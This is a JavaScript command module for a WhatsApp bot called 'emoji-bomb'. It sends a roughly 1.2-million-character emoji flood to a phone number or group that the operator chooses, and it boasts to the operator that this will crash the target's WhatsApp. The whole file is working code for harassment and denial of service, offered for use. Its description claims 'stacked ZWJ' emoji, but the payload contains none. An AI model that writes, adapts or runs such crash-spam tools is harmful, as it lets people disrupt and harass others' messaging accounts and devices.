export default {
  name: "emoji-bomb",
  description: "Send stacked ZWJ emoji spam crash",
  async execute(msg, { sock, args }) {
    try {
      let target = args[0];

      if (!target) {
        return sock.sendMessage(msg.key.remoteJid, {
          text: `⚠️ Usage: ?emoji-bomb <number/group>\n\nExample:\n?emoji-bomb 234XXXXXXXXXX\n?emoji-bomb 120XXXXXXX@g.us`
        });
      }

      // Format target
      if (!target.includes("@g.us") && !target.includes("@s.whatsapp.net")) {
        if (target.length < 11) {
          return sock.sendMessage(msg.key.remoteJid, { 
            text: "⚠️ Invalid number. Use format: 234XXXXXXXXXX" 
          });
        }
        target = target + "@s.whatsapp.net";
      }

      console.log(`[INFO] Executing emoji-bomb on target: ${target}`);

      // Generate emoji bomb payload
      const payload = "👾👹👺💀☠️👻🤖👽🎃😈👿💩🤡👹👺💀☠️👻🤖👽🎃😈👿💩🤡".repeat(50_000);

      // Send the payload
      await sock.sendMessage(target, { text: payload });

      await sock.sendMessage(msg.key.remoteJid, {
        text: `💀 Emoji bomb sent to ${target}!\n📊 Payload size: ${payload.length} characters\n⚠️ WARNING: This WILL crash the target's WhatsApp!`
      });

    } catch (error) {
      console.error(`[ERROR] Emoji-bomb command failed:`, error);
      await sock.sendMessage(msg.key.remoteJid, {
        text: "❌ Failed to send emoji bomb: " + error.message
      });
    }
  }
};